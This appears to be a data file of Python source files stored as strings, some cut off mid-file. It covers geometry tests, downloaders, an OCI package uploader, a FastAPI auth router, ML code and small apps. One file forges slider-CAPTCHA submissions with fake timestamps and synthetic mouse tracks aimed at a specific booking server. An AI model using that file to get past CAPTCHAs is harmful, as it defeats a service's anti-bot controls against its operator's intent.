    "import pytest\nfrom math import inf\nfrom copy import copy\n\nfrom src.origametry.line import Line\nfrom src.origametry.point import Point\n\n\n\"\"\" create directly from coefficients of the general-form line equation \"\"\"\n\ndef test_line_from_coefficients():\n    line = Line(3, 2, 1)\n\n    assert line.a == 3\n    assert line.b == 2\n    assert line.c == 1\n\ndef test_line_from_scaled_coefficients():\n    line = Line(1, 2, 4)\n\n    # coefficients should be scaled such that c=1\n    assert line.a == .25\n    assert line.b == .5\n    assert line.c == 1\n\ndef test_line_from_partial_coefficients():\n    line = Line(2, 1)\n\n    assert line.a == 2\n    assert line.b == 1\n    assert line.c == 0\n\ndef test_line_from_partial_scaled_coefficients():\n    line = Line(1, 2)\n\n    # coefficients should be scaled such that b=1\n    assert line.a == .5\n    assert line.b == 1\n    assert line.c == 0\n\ndef test_invalid_coefficients():\n    with pytest.raises(ValueError):\n        Line(0, 0, 1)\n\n\"\"\" create from two distinct points \"\"\"\n\ndef test_line_from_two_points():\n    point_1 = Point(0, 0)\n    point_2 = Point(1, 2)\n\n    line = Line(point_1, point_2)\n\n    assert line.a == -2\n    assert line.b == 1\n    assert line.c == 0\n\ndef test_horizontal_line_from_two_points():\n    point_1 = Point(0, 0)\n    point_2 = Point(1, 0)\n\n    line = Line(point_1, point_2)\n\n    assert line.a == 0\n    assert line.b == 1\n    assert line.c == 0\n\ndef test_vertical_line_from_two_points():\n    point_1 = Point(0, 0)\n    point_2 = Point(0, 1)\n\n    line = Line(point_1, point_2)\n\n    assert line.a == 1\n    assert line.b == 0\n    assert line.c == 0\n\ndef test_line_from_two_nondistinct_points():\n    point_1 = Point(0, 0)\n    point_2 = Point(0, 0)\n\n    with pytest.raises(ValueError):\n        Line(point_1, point_2)\n\n\"\"\" create from point and gradient \"\"\"\n\ndef test_line_from_point_and_gradient():\n    point = Point(1, 1)\n\n    line = Line(point, 2)\n\n    assert line.a == -2\n    assert line.b == 1\n    assert line.c == 1\n\ndef test_line_through_origin_from_point_and_gradient():\n    point = Point(1, 2)\n\n    line = Line(point, 2)\n\n    assert line.a == -2\n    assert line.b == 1\n    assert line.c == 0\n\ndef test_horizontal_line_from_point_and_gradient():\n    point = Point(0, 1)\n\n    line = Line(point, 0)\n\n    assert line.a == 0\n    assert line.b == -1\n    assert line.c == 1\n\ndef test_horizontal_line_through_origin_from_point_and_gradient():\n    point = Point(0, 0)\n\n    line = Line(point, 0)\n\n    assert line.a == 0\n    assert line.b == 1\n    assert line.c == 0\n\ndef test_vertical_line_from_point_and_gradient():\n    point = Point(1, 0)\n\n    line = Line(point, inf)\n\n    assert line.a == -1\n    assert line.b == 0\n    assert line.c == 1\n\ndef test_vertical_line_through_origin_from_point_and_gradient():\n    point = Point(0, 0)\n\n    line = Line(point, inf)\n\n    assert line.a == 1\n    assert line.b == 0\n    assert line.c == 0\n\n\"\"\" create from gradient only (assumed through origin) \"\"\"\n\ndef test_line_from_gradient():\n    line = Line(2)\n\n    assert line.a == -2\n    assert line.b == 1\n    assert line.c == 0\n\ndef test_horizontal_line_from_gradient():\n    line = Line(0)\n\n    assert line.a == 0\n    assert line.b == 1\n    assert line.c == 0\n\ndef test_vertical_line_from_gradient():\n    line = Line(inf)\n\n    assert line.a == 1\n    assert line.b == 0\n    assert line.c == 0\n\n\"\"\" Line equality comparison \"\"\"\n\ndef test_compare_lines_eq():\n    line_1 = Line(-2, 1)\n\n    point_1 = Point(0, 0)\n    point_2 = Point(1, 2)\n    line_2 = Line(point_1, point_2)\n\n    assert line_1 == line_2\n\ndef test_compare_lines_almost_eq():\n    line_1 = Line(-2, 1)\n\n    nearly_0 = .4 - .3 - .1\n    point_1 = Point(nearly_0, nearly_0)\n    point_2 = Point(1, 2)\n    line_2 = Line(point_1, point_2)\n\n    # lines don't benefit from fuzzy matching\n    assert line_1 != line_2\n\ndef test_compare_lines_neq():\n    line_1 = Line(1, 0)\n\n    point_1 = Point(0, 0)\n    point_2 = Point(1, 2)\n    line_2 = Line(point_1, point_2)\n\n    assert line_1 != line_2\n\ndef test_compare_line_with_non_line():\n    line = Line(1, 0)\n    other = (Line(2, 1),)\n\n    assert line != other\n\ndef test_compare_non_line_with_line():\n    other = (Line(2, 1),)\n    line = Line(1, 0)\n\n    assert other != line\n\n\"\"\" clone a Line \"\"\"\n\ndef test_copy_line():\n    line_1 = Line(1, 2)\n    line_2 = copy(line_1)\n\n    assert line_1 == line_2\n\n\"\"\" calculate the gradient \"\"\"\n\ndef test_positive_slope():\n    point_1 = Point(1, 2)\n    point_2 = Point(5, 8)\n\n    line = Line(point_1, point_2)\n\n    assert line.gradient == 1.5\n\ndef test_negative_slope():\n    point_1 = Point(1, 8)\n    point_2 = Point(5, 2)\n\n    line = Line(point_1, point_2)\n\n    assert line.gradient == -1.5\n\ndef test_horizontal():\n    point_1 = Point(0, 0)\n    point_2 = Point(1, 0)\n\n    line = Line(point_1, point_2)\n\n    assert line.gradient == 0\n\ndef test_vertical():\n    point_1 = Point(0, 0)\n    point_2 = Point(0, 1)\n\n    line = Line(point_1, point_2)\n\n    assert line.gradient == inf\n\n\"\"\" `Line.intersection` implementation \"\"\"\n\ndef test_intersection_with_a",
    "def bulid_request(x_index: int):\n    # \u4f2a\u9020\u9a8c\u8bc1\u7801\u62a5\u6587\uff0c\u4e2a\u4eba\u8ba4\u4e3astartSlidingTime\uff0centSlidingTime\u670d\u52a1\u5668\u5e94\u8be5\u6ca1\u7ba1\uff0c\u56e0\u4e3a3-22\u53f7\u4e0b\u5348\u66fe\u4f7f\u75283-19\u53f7\u7684startSlidingTime\u6210\u529f\u9884\u5b9a\n\n    startSlidingTime, endSlidingTime = startEndSlidingTime(x_index=x_index)\n    # bgImageWidth bgImageHeight sliderImageWidth sliderImageHeight \u5747\u4e3a\u5b9a\u503c\n    unkonwn_string = \"22a831d54f814f9ba8699f0d407ca995\"\n    yzm_data = {\n        \"bgImageWidth\": 260,\n        \"bgImageHeight\": 0,\n        \"sliderImageWidth\": 0,\n        \"sliderImageHeight\": 159,\n        \"startSlidingTime\": str(startSlidingTime),\n        \"entSlidingTime\": str(endSlidingTime),\n        \"trackList\": \"[{'x': 0, 'y': 0, 'type': 'down', 't': 68},\"\n                     \" {'x': 10, 'y': 0, 'type': 'move', 't': 81},\"\n    }\n    # generate_mouse_movement_tracklist(x_index)\n    yzm_data = str(yzm_data) + f\"synjones{unkonwn_string}synjoneshttp://202.117.17.144:8071 \"\n    return yzm_data\n\n\ndef startEndSlidingTime(x_index: int):\n    from datetime import datetime, timedelta\n    import random\n\n    # \u83b7\u53d6\u5f53\u524d\u7684 UTC \u65f6\u95f4\n    utc_now = datetime.utcnow()\n\n    # \u751f\u6210\u670d\u4ece\u6b63\u6001\u5206\u5e03\u7684\u968f\u673a\u6beb\u79d2\u6570\uff0c\u5747\u503c\u4e3a50\u6beb\u79d2\uff0c\u65b9\u5dee\u4e3a20\u6beb\u79d2\n    random_delay = random.gauss(50, 20)\n\n    # \u5c06\u968f\u673a\u6beb\u79d2\u6570\u6dfb\u52a0\u5230\u5f53\u524d UTC \u65f6\u95f4\u4e2d\n    delayed_utc_time = utc_now + timedelta(milliseconds=random_delay) + timedelta(milliseconds=-3500)\n\n    # \u5c06\u7ed3\u679c\u683c\u5f0f\u5316\u4e3a ISO 8601 \u683c\u5f0f\u7684\u5b57\u7b26\u4e32\uff0c\u5e76\u4e14\u6839\u636e\u683c\u5f0f\uff0c\u53ea\u4fdd\u7559\u4e09\u4f4d\u5c0f\u6570\n    startSlidingTime = delayed_utc_time.strftime('%Y-%m-%dT%H:%M:%S.%f')[:-3] + 'Z'\n\n    # \u751f\u6210startSlidingTime\u548cendSlidingTime\u4e4b\u95f4\u7684\u95f4\u9694\uff0c\u6839\u636e\u4e4b\u524d\u7684\u89c2\u5bdf\uff0c\u53d6\u5747\u503c\u4e3a1.5s\uff0c\u65b9\u5dee\u4e3a0.3s\n    random_slidingtime = random.gauss(200, 30) + int(x_index) * 1.8\n\n    endSlidingTime = utc_now + timedelta(milliseconds=random_slidingtime) + timedelta(milliseconds=-3500)\n\n    endSlidingTime = endSlidingTime.strftime('%Y-%m-%dT%H:%M:%S.%f')[:-3] + 'Z'\n\n    return startSlidingTime, endSlidingTime\n\n\ndef generate_mouse_movement_tracklist(x_index: int):\n    import json\n    import random\n    from datetime import datetime, timedelta\n\n    track_list = []\n\n    # \u751f\u6210\u9f20\u6807\u79fb\u52a8\u8bb0\u5f55\n    x = 0\n    y = 0\n    t = 68\n    missing_square = 66\n    x_goal = round((x_index + missing_square/2) * 278 / 590)  # \u4ece\u6e32\u67d3\u9a8c\u8bc1\u7801\u6846\u7684js\u6587\u4ef6\u53ef\u4ee5\u8bfb\u51fa\uff0c\u867d\u7136\u56fe\u7247\u50cf\u7d20\u4e00\u822c\u4e3a590\uff0c\u4f46\u653e\u7f6e\u56fe\u7247\u7684\u9a8c\u8bc1\u7801\u6846\u4ec5\u4e3a278\u50cf\u7d20\uff0c\u9700\u8981\u7f29\u5c0f\n    print(f\"\u6839\u636e\u9a8c\u8bc1\u7801\u7a97\u4f53\u4fee\u6b63\u540e\u8ddd\u79bb:{x_goal}\")\n    track_list.append({\"x\": x, \"y\": y, \"type\": \"down\", \"t\": t})\n    for _ in range(100):\n        # \u6dfb\u52a0\u4e00\u4e2a\u968f\u673a\u53d8\u5316\u5230x\u503c\n        x += random.normalvariate(10, 1)\n        x = round(x)\n        if x > x_goal:\n            break\n        # \u968f\u673a\u8c03\u6574y\u503c\n        y += random.choices([0, 1, -1], weights=[0.8, 0.1, 0.1])[0]\n        y = max(-1, min(y, 1))  # \u786e\u4fddy\u4fdd\u6301\u5728\u8303\u56f4\u5185\n        y = round(y)\n        # \u6839\u636e\u5747\u503c\u4e3a18\uff0c\u65b9\u5dee\u4e3a3\u7684\u6b63\u6001\u5206\u5e03\u751f\u6210\u65f6\u95f4\u95f4\u9694\n        t += int(random.normalvariate(18, 2.5))\n        t = round(t)\n        track_list.append({\"x\": x, \"y\": y, \"type\": \"move\", \"t\": t})\n\n    track_list.append({\"x\": str(x_goal), \"y\": str(0), \"type\": \"up\", \"t\": str(t + 18)})\n\n    return track_list  # json.dump\u4e0d\u80fd\u653e\u5728\u8fd9\u91cc\n\n",
    "from pytube import YouTube\nimport os\nimport customtkinter\n\n\ndef SucessNote():\n    texto2= customtkinter.CTkLabel(janela, text=\"Successfully Downloaded!!!\", font=(\"Consolas\", 15))\n    texto2.pack()\n    \ndef FailNote():\n    texto2= customtkinter.CTkLabel(janela, text=\"Something Went Wrong Please Try Again....\", font=(\"Consolas\", 15))\n    texto2.pack(padx=10, pady=10)\n\ndef Dowload(URL):\n    yt = YouTube(URL) \n    try:\n        print(\"\\nDownloading....\")\n        video = yt.streams.filter(only_audio=True).first()\n        out_file = video.download()\n        base, ext = os.path.splitext(out_file)\n        new_file = base + \".mp3\"\n        os.rename(out_file, new_file)\n        SucessNote()\n        print(\"\\nSuccessfully Downloaded!!!\\n\")\n    except:\n        FailNote()\n        print(\"\\nSomething Went Wrong Please Try Again....\\n\")\n        \n\njanela = customtkinter.CTk()\njanela.title(\"Music Downloader\")\njanela.geometry(\"500x300\")\njanela.minsize(500,300)\n\n\ntexto= customtkinter.CTkLabel(janela, font=(\"Consolas\", 20),text=\"Music Download\")\ntexto.pack(padx=20, pady=20)\n\nURL = customtkinter.CTkEntry(janela,width=400, placeholder_text=\"Insert Link\")\nURL.pack(padx=50,pady=50)\n\nbotao = customtkinter.CTkButton(janela, text=\"Download\", command=lambda: Dowload(URL.get()))\nbotao.pack(padx=10,pady=10)\n\njanela.mainloop()\n",
    "#!/usr/bin/python3\n\nfrom debian import debian_support\nimport oras.provider\nimport hashlib\nimport os\n\noci_repo = os.environ.get(\"OCI_REPO\")\noci_auth_name = os.environ.get(\"OCI_AUTH_NAME\")\n\ndef calculate_sha256(file_path):\n    sha256_hash = hashlib.sha256()\n    with open(file_path, \"rb\") as f:\n        for byte_block in iter(lambda: f.read(4096), b\"\"):\n            sha256_hash.update(byte_block)\n    return sha256_hash.hexdigest()\n\ndef read_repo_file(repo_file):\n    all_pkg_infos = []\n    file_sha256_info_list = []\n    for pkg_info in list(repo_file):\n        pkg_metainfo = {}\n        for tag_value in pkg_info:\n            pkg_metainfo[tag_value[0]] = tag_value[1]\n        all_pkg_infos.append(pkg_metainfo)\n    if \"Filename\" in all_pkg_infos[0]:\n        for all_pkg_info in all_pkg_infos:\n            file_sha256_info = {}\n            file_sha256_info[\"Filename\"] = all_pkg_info[\"Filename\"].strip(\"./\")\n            file_sha256_info[\"SHA256\"] = all_pkg_info[\"SHA256\"]\n            file_sha256_info_list.append(file_sha256_info)\n    elif \"Checksums-Sha256\" in all_pkg_infos[0]:\n        for all_pkg_info in all_pkg_infos:\n            for sha256_info in all_pkg_info[\"Checksums-Sha256\"].split(\"\\n\"):\n                if sha256_info == \"\":\n                    continue\n                file_sha256_info = {}\n                file_sha256_info[\"Filename\"] = sha256_info.split(\" \")[2]\n                file_sha256_info[\"SHA256\"] = sha256_info.split(\" \")[0]\n                file_sha256_info_list.append(file_sha256_info)\n    else:\n        return {}\n    return  file_sha256_info_list\n\ndef upload_blobs_manifest(blob_file_name, blob_file_digest, oci_repo):\n    token = os.environ.get(\"GH_TK\")\n    class MyProvider(oras.provider.Registry):\n        pass\n\n    reg = MyProvider()\n    container = reg.get_container(oci_repo)\n    manifest = reg.get_manifest(container)\n\n    blob = os.path.join(os.getcwd(), blob_file_name)\n    blob_name = os.path.basename(blob)\n    annotset = oras.oci.Annotations({})\n    layer = oras.oci.NewLayer(blob, \"application/octet-stream\", is_dir=False)\n    layer[\"annotations\"] = {oras.defaults.annotation_title: blob_name}\n    reg.set_basic_auth(oci_auth_name, token)\n    print(\"going to upload blob %s\" % blob)\n    print(reg.upload_blob(blob, container, layer))\n\n    new_layers = []\n    for old_layer in manifest[\"layers\"]:\n        if  old_layer[\"annotations\"][oras.defaults.annotation_title] == blob_file_name:\n            print(\"going to delete old %s layer %s\" % (blob_file_name, old_layer))\n        else:\n            if old_layer[\"annotations\"] == {oras.defaults.annotation_title: blob_name} and old_layer[\"digest\"] != \"sha256:\" + blob_file_digest:\n                print(\"going to delete conflict layer %s\" % old_layer)\n            else:\n                new_layers.append(old_layer)\n\n    manifest[\"layers\"] = new_layers\n    manifest[\"layers\"].append(layer)\n    print(\"going to upload manifest\")\n    print(reg.upload_manifest(manifest, container))\n\ndef delete_blobs_manifest(blob_file_name, blob_file_digest, oci_repo):\n    token = os.environ.get(\"GH_TK\")\n    class MyProvider(oras.provider.Registry):\n        pass\n\n    reg = MyProvider()\n    container = reg.get_container(oci_repo)\n    manifest = reg.get_manifest(container)\n    new_layers = []\n    delete_layer = False\n    for old_layer in manifest[\"layers\"]:\n        if blob_file_name == old_layer[\"annotations\"][oras.defaults.annotation_title]:\n            delete_layer = True\n    for old_layer in manifest[\"layers\"]:\n        if delete_layer:\n            if blob_file_name == old_layer[\"annotations\"][oras.defaults.annotation_title]:\n                print(\"%s exist in remote, going to delete\" % blob_file_name)\n            else:\n                new_layers.append(old_layer)\n    manifest[\"layers\"] = new_layers\n    print(\"going to upload manifest\")\n    reg.set_basic_auth(oci_auth_name, token)\n    print(reg.upload_manifest(manifest, container))\n\n\n# Get manifest from remote repo\nclass MyProvider(oras.provider.Registry):\n    pass\n\nreg = MyProvider()\ncontainer = reg.get_container(oci_repo)\nmanifest = reg.get_manifest(container)\n\n# Get remote package file name and digest info from manifest\nremote_file_sha256_infos =  []\nremote_extra_file_sha256_infos =  []\nfor oci_layer in manifest[\"layers\"]:\n    remote_file_sha256_info = {}\n    remote_file_sha256_info[\"Filename\"] = oci_layer[\"annotations\"][\"org.opencontainers.image.title\"]\n    remote_file_sha256_info[\"SHA256\"] = oci_layer[\"digest\"].split(\":\")[1]\n    if oci_layer[\"annotations\"][\"org.opencontainers.image.title\"] == \"Packages\" or oci_layer[\"annotations\"][\"org.opencontainers.image.title\"] == \"Sources\":\n        remote_extra_file_sha256_infos.append(remote_file_sha256_info)\n    else:\n        remote_file_sha256_infos.append(remote_file_sha256_info)\n\n# Read info of packages to upload from local Packages and Sources\npkg_file = debian_support.PackageFile(\"Packages\")\nsource_file = debian_support.PackageFile(\"Sources\")\npackage_info_list = read_repo_file(pkg_file)\nsource_info",
    "from fastapi import status, Depends, APIRouter, Header, HTTPException\nfrom fastapi.responses import JSONResponse\nfrom fastapi.security import OAuth2PasswordRequestForm, OAuth2PasswordBearer\nfrom app.usecases.authenticate_usecase import AuthenticateUseCase\nfrom app.entities.dto.user_register_schema import UserRegisterSchema\nfrom infrastructure.database.mysql.repository.users_repository import UserRepository\nfrom app.utils.token_manager import TokenManager\n\n\nrouter = APIRouter(prefix=\"/api/auth\", tags=[\"Auth\"])\n\noauth2 = OAuth2PasswordBearer(\"/api/auth/authenticate\")\nget_usecase = lambda: AuthenticateUseCase(user_repository=UserRepository())\n\n\ndef token_validation(token = Depends(oauth2)):\n    if not TokenManager.is_valid(token):\n        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail=\"invalid or expired token!\")\n    \n\n@router.post(\"/authenticate\",status_code=status.HTTP_200_OK,)\nasync def authenticate(form_data: OAuth2PasswordRequestForm = Depends(), usecase: AuthenticateUseCase = Depends(get_usecase)) -> None:\n    response = usecase.authenticate_user(form_data.username, form_data.password)\n    return JSONResponse(\n        status_code=response.status_code,\n        content=response.content,\n        headers=response.headers,\n    )\n\n\n@router.post(\"/refresh\", status_code=status.HTTP_200_OK)\nasync def refresh_token(token=Header(), usecase: AuthenticateUseCase = Depends(get_usecase)) -> None:\n    response = usecase.refresh_token(token)\n    return JSONResponse(\n        status_code=response.status_code,\n        content=response.content,\n        headers=response.headers,\n    )",
    "import torch\nimport tqdm\nimport k_diffusion.sampling\nfrom modules import sd_samplers_common, sd_samplers_kdiffusion, sd_samplers\nfrom tqdm.auto import trange, tqdm\nfrom k_diffusion import utils\nimport math\n\n\nNAME = 'Euler_Max'\nALIAS = 'euler_max'\n\n\n@torch.no_grad()\ndef sample_euler_max(model, x, sigmas, extra_args=None, callback=None, disable=None, s_churn=0., s_tmin=0.,\n                   s_tmax=float('inf'), s_noise=1.):\n    extra_args = {} if extra_args is None else extra_args\n    s_in = x.new_ones([x.shape[0]])\n    for i in trange(len(sigmas) - 1, disable=disable):\n        gamma = max(s_churn / (len(sigmas) - 1), 2 ** 0.5 - 1) if s_tmin <= sigmas[i] <= s_tmax else 0.\n        eps = torch.randn_like(x) * s_noise\n        sigma_hat = sigmas[i] * (gamma + 1)\n        if gamma > 0:\n            x = x - eps * (sigma_hat ** 2 - sigmas[i] ** 2) ** 0.5\n        denoised = model(x, sigma_hat * s_in, **extra_args)\n        d = k_diffusion.sampling.to_d(x, sigma_hat, denoised)\n        if callback is not None:\n            callback({'x': x, 'i': i, 'sigma': sigmas[i], 'sigma_hat': sigma_hat, 'denoised': denoised})\n        dt = sigmas[i + 1] - sigma_hat\n        # Euler method\n        x = x + (math.cos(i + 1)/(i + 1) + 1) * d * dt\n    return x\n\n\nif not NAME in [x.name for x in sd_samplers.all_samplers]:\n    euler_max_samplers = [(NAME, sample_euler_max, [ALIAS], {})]\n    samplers_data_euler_max_samplers = [\n        sd_samplers_common.SamplerData(label, lambda model, funcname=funcname: sd_samplers_kdiffusion.KDiffusionSampler(funcname, model), aliases, options)\n        for label, funcname, aliases, options in euler_max_samplers\n        if callable(funcname) or hasattr(k_diffusion.sampling, funcname)\n    ]\n    sd_samplers.all_samplers += samplers_data_euler_max_samplers\n    sd_samplers.all_samplers_map = {x.name: x for x in sd_samplers.all_samplers}\n",
    "\r\n\"\"\"\r\nCreated By *Abdullah EL-Yamany*\r\n-------------------------------\r\n\"\"\"\r\n\r\nfrom selenium import webdriver\r\nfrom selenium.webdriver.common.by import By\r\nimport time, urllib.request\r\n\r\n\r\ndriver = webdriver.Chrome()\r\ndriver.get(\"https://www.instagram.com/\")\r\n\r\ntime.sleep(2)\r\n\r\n# -------- Login ------- #\r\nwhile True:\r\n    try:\r\n        username = driver.find_element(By.CSS_SELECTOR, 'input[name=\"username\"]')\r\n        password = driver.find_element(By.CSS_SELECTOR, 'input[name=\"password\"]')\r\n        break\r\n    except:\r\n        time.sleep(3)\r\n\r\nusername.clear()\r\npassword.clear()\r\nusername.send_keys(\"xxxxxxxxxxx\") # Write Email or Phone\r\npassword.send_keys(\"xxxxxxxxxxx\") # Write Password\r\n\r\ntime.sleep(1)\r\nlogin = driver.find_element(By.CSS_SELECTOR, 'button[type=\"submit\"]').click()\r\n\r\n#save your login info?\r\nwhile True:\r\n    time.sleep(5)\r\n    try:\r\n        notnow = driver.find_element(By.XPATH, '//div[@class=\"_ac8f\"]/div[@role=\"button\"]').click()\r\n        break\r\n    except:\r\n        continue\r\n\r\n\r\n#turn on notif\r\ntime.sleep(2)\r\nnotnow2 = driver.find_element(By.XPATH, \"//button[contains(text(), 'Not Now')]\").click()\r\n\r\n# post\r\npost_link = \"https://www.instagram.com/p/xxxxxxxxxxxxxxxxxxxxxxxx\" # Write Link Of Post\r\n\r\n\r\n#get videos and images\r\ndownload_url = ''\r\n\r\ndriver.get(post_link)\r\nshortcode = driver.current_url.split('/')[-2]\r\ntime.sleep(5)\r\n\r\nmain_div = driver.find_element(By.CSS_SELECTOR, 'div[class=\"x6s0dn4 x1dqoszc xu3j5b3 xm81vs4 x78zum5 x1iyjqo2 x1tjbqro\"]')\r\n\r\nimgs_link = []\r\n\r\nwhile True:\r\n    imgs = main_div.find_elements(By.CSS_SELECTOR, \"img[style='object-fit: cover;']\")\r\n    for img in imgs:\r\n        if img.get_attribute('src') not in imgs_link:\r\n            imgs_link.append(img.get_attribute('src'))\r\n    \r\n    try:\r\n        driver.find_element(By.CSS_SELECTOR, 'button[aria-label=\"Next\"]').click()\r\n        time.sleep(5)\r\n    except:\r\n        break\r\n\r\n\r\nnum = 1\r\ntime.sleep(3)\r\nfor link in imgs_link:\r\n    urllib.request.urlretrieve(link, f'img_{num}{shortcode}.jpg')\r\n    num += 1\r\n    time.sleep(6)\r\n\r\n",
    "import torch\nfrom torch import nn\nfrom torch.nn import functional as F\nimport math\n\nclass PositionalEncoding(nn.Module):\n  def __init__(self, d_model, max_len=512, dropout_prob=0.1):\n    super().__init__()\n\n    self.dropout = nn.Dropout(dropout_prob)\n\n    position_ids = torch.arange(max_len).unsqueeze(1)\n    div_term = torch.exp(torch.arange(0, d_model, 2) * (-math.log(10000.0) / d_model))\n    pe = torch.zeros(size=(1, max_len, d_model))\n    pe[0, :, 0::2] = torch.sin(position_ids / div_term)\n    pe[0, :, 1::2] = torch.cos(position_ids / div_term)\n    self.register_buffer('pe', pe)\n\n  def forward(self, x):\n    # x shape (batch_size, seq_length, d_model)\n    return x + self.pe[:, :x.size(1), :]\n\ndef _batch_gather(x, inds):\n    assert x.dim() == 3\n    batch_size = x.size(0)\n    length = x.size(1)\n    dim = x.size(2)\n\n    batch_offsets = torch.arange(batch_size, device=inds.device) * length\n    batch_offsets = batch_offsets.unsqueeze(-1)\n    assert batch_offsets.dim() == inds.dim()\n    results = F.embedding(batch_offsets + inds, x.view(batch_size * length, dim)) # batch_size, T, hidden_size\n    return results\n",
    "import sys\nimport random\nimport math\nfrom copy import deepcopy\n\nrandom.seed(1)\n\n# Disables logs leaking from pygame\nsys.stdout = None\nsys.stderr = None\nimport pygame\nsys.stdout = sys.__stdout__\nsys.stderr = sys.__stderr__\n\nclass Matrix:\n    def __init__(self, data: [[int]]):\n        self.row_count = len(data)\n        self.col_count = len(data[0])\n        self.data = data\n    @classmethod\n    def from_size(self, row_count: int, col_count: int, rand = False):\n        if rand:\n            data = [[random.uniform(-1, 1) for _ in range(col_count)] for _ in range(row_count)]\n        else:\n            data = [[0] * col_count for _ in range(row_count)]\n        return Matrix(data)\n    @classmethod\n    def from_row(self, row: [int]):\n            return Matrix([row])\n    def __mul__(self, other):\n        if self.col_count != other.row_count:\n            raise Exception(f\"Mismatched order of Matrices for multiplication {(self.row_count, self.col_count)} vs {(other.row_count, other.col_count)}\")\n        res = [[0 for _ in range(other.col_count)] for _ in range(self.row_count)]\n        for i in range(self.row_count):\n            for j in range(other.col_count):\n                for k in range(self.col_count):\n                    res[i][j] += self.data[i][k] * other.data[k][j]\n        return Matrix(res)\n    def __add__(self, other):\n        if self.row_count != other.row_count or self.col_count != other.col_count:\n            raise Exception(f\"Mismatched order of Matrices for addition {(self.row_count, self.col_count)} vs {(other.row_count, other.col_count)}\")\n        res = [[0 for _ in range(self.col_count)] for _ in range(self.row_count)]\n        for i in range(self.row_count):\n            for j in range(self.col_count):\n                res[i][j] = self.data[i][j] + other.data[i][j]\n        return Matrix(res)\n    def sigmoid(self):\n        if self.row_count != 1:\n            raise Exception(\"Can't apply activation function for non row matrix\")\n        for i in range(self.col_count):\n            self.data[0][i] = 1 / (1 + math.e ** -self.data[0][i])\n    def mutate(self, fuzz_factor: float):\n        for row in self.data:\n            for i in range(len(row)):\n                row[i] += random.uniform(-fuzz_factor, fuzz_factor)\n                row[i] *= 1 + random.uniform(-fuzz_factor, fuzz_factor)\n\nclass NN:\n    def __init__(self, architecture: [int], rand = False):\n        self.arch = architecture\n        self.layers = []\n        self.biases = []\n        for i in range(len(architecture) - 1):\n            self.layers.append(Matrix.from_size(architecture[i], architecture[i + 1], rand))\n            self.biases.append(Matrix.from_size(1, architecture[i + 1], rand))\n    def solve(self, input: Matrix) -> Matrix:\n        temp = input\n        for layer, bias in zip(self.layers, self.biases):\n            temp = temp * layer\n            temp = temp + bias\n            temp.sigmoid()\n        return temp\n    def mutate(self, fuzz_factor: float):\n        for layer in self.layers:\n            layer.mutate(fuzz_factor)\n        for bias in self.biases:\n            bias.mutate(fuzz_factor)\n    def __str__(self):\n        res = f\"Arch: {self.arch} | \"\n        for i, layer in enumerate(self.layers):\n            res += f\"L#{i}: {layer.data}, \"\n        res = res[:-1]\n        res += \"| \"\n        for i, bias in enumerate(self.biases):\n            res += f\"B#{i}: {bias.data}, \"\n        return res[:-2]\n\npygame.init()\n\nDISPLAY = pygame.display.set_mode((640, 480), vsync = 1)\nFONT_SIZE = 36\nFONT = pygame.freetype.Font(None, FONT_SIZE)\nCOLOR_WHITE = (255, 255, 255)\nCOLOR_BLACK = (0, 0, 0)\nCOLOR_RED = (255, 0, 0)\nCOLOR_GREEN = (0, 255, 0)\nCOLOR_BLUE = (0, 0, 255)\n\nGRAVITY: float = -0.001\nTERMINAL_VELOCITY: float = 0.05\nJUMP_VELCOITY: float = 0.015\nOBSTACLE_SPEED: float = 0.002\nOBSTACLE_DENSITY: int = 5\nBALL_RADIUS: float = 0.01\nFPS: int = 60\n\ndef lerp(x, min_x, max_x, min_out, max_out):\n    x -= min_x\n    x /= (max_x - min_x)\n    x *= (max_out - min_out)\n    x += min_out\n    return x\n\ndef restrict(value, range_min, range_max):\n    value = max(value, range_min)\n    value = min(value, range_max)\n    return value\n\nclass Obstacle:\n    def __init__(self, height, gap):\n        self.top = height + gap\n        self.bottom = height\n        self.gap = gap\n        self.mid = (self.top + self.bottom) / 2\n    def render(self, pos_x):\n        pos_x = lerp(pos_x, 0, 1, 0, DISPLAY.get_width())\n        top = lerp(self.top, 0, 1, DISPLAY.get_height(), 0)\n        bottom = lerp(self.bottom, 0, 1, DISPLAY.get_height(), 0)\n        line_width = int(lerp(BALL_RADIUS, 0, 1, 0, DISPLAY.get_width()))\n        pygame.draw.line(DISPLAY, COLOR_BLUE, (pos_x, 0), (pos_x, top), line_width)\n        pygame.draw.line(DISPLAY, COLOR_BLUE, (pos_x, bottom), (pos_x, DISPLAY.get_height()), line_width)\n    def random():\n        return Obstacle(random.uniform(0.2, 0.5), random.uniform(0.15, 0.3))\n    def collision(self, pos) -> bool:\n        return pos >= self.top or pos <= self.bottom\n\nclass Agen",
    "import dataclasses\nimport os\nfrom typing import Dict, Optional\nfrom uuid import uuid4\nimport streamlit as st\n\nimport requests\n\nimport json\n\nfrom webui.common import *\n\nBASE_URL = os.getenv('API_BASE_URL')\n\n# Helper method to handle UUID serialization.\ndef uuid_to_str(obj):\n    if isinstance(obj, uuid.UUID):\n        return str(obj)\n    raise TypeError(f\"Object of type {obj.__class__.__name__} is not JSON serializable\")\n\ndef auth(tg_id: int) -> Optional[UserControllerResp]:\n    url = f\"{BASE_URL}users/auth\"\n    request = AuthUserRequest(tg_id)\n    json_response = requests.post(url, json=dataclasses.asdict(request))\n    if json_response.ok:\n        return UserControllerResp.from_json(json_response.content)\n    else:\n        return None\n\n\ndef register_trip(trip: AddTripRequest):\n    url = f\"{BASE_URL}trips/add\"\n\n    json_serialized = json.dumps(dataclasses.asdict(trip), default=uuid_to_str)\n    # json_serialized = trip.to_json()\n    headers = {'Content-type': 'application/json'}\n    json_response = requests.post(url, data=json_serialized, headers=headers)\n    if json_response.ok:\n        print(f\"Successfully added trip: {trip}\")\n    else:\n        print(json_response.text)\n        print(f\"Failed to add trip: {trip}\")\n\n\ndef find_trips(filter: FindTripRequest) -> FindTripResponse:\n    url = f\"{BASE_URL}trips/find\"\n\n    json_serialized = filter.to_json()\n    headers = {'Content-type': 'application/json'}\n\n    json_response = requests.post(url, data=json_serialized, headers=headers)\n\n    if json_response.ok:\n        trip_response = FindTripResponse.from_json(json_response.content)\n        return trip_response\n    else:\n        return None\n\ndef get_all_stations() -> List[StationShort]:\n    url = f\"{BASE_URL}stations\"\n    json_response = requests.get(url)\n    if json_response.ok:\n        stations = StationShort.schema().loads(json_response.content, many=True)\n        return stations\n    else:\n        return None\n\n\n@st.cache_data\ndef get_stations_by_type(transport_type: TransportType) -> List[StationShort]:\n    api_transport_type_name = transport_type_get_api_view(transport_type)\n    url = 